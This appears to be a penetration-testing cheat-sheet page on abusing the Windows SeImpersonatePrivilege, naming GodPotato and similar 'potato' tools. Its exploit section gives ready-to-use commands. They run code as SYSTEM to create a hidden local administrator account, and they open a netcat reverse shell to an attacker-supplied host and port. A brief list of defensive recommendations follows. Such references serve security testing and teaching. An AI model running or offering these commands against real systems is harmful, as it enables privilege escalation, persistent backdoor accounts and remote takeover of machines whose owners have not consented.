---
layout: default
title: SeImpersonatePrivilege Abuse
parent: Windows
nav_order: 11
permalink: /windows/seimpersonateprivilege/
---

# SeImpersonatePrivilege Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

Example below using [GodPotato](https://github.com/BeichenDream/GodPotato). *SeImpersonatePrivilege* can be also leveraged by [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [RoguePotato](https://github.com/antonioCoco/RoguePotato), and [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato).

```bash
# Check if SeImpersonatePrivilege is enabled for the current user.
whoami /priv

# Execute command as NT AUTHORITY/SYSTEM.
.\GodPotato.exe -cmd "net user $username $password /add; net localgroup administrators $username /add"
.\GodPotato.exe -cmd "nc.exe $lhost $lport -e cmd"
```

## Recommendations

- [ ] Disable SeImpersonatePrivilege on domain and local users.
- [ ] Enforce EDR on Windows hosts to detect and block GodPotato-like exploits.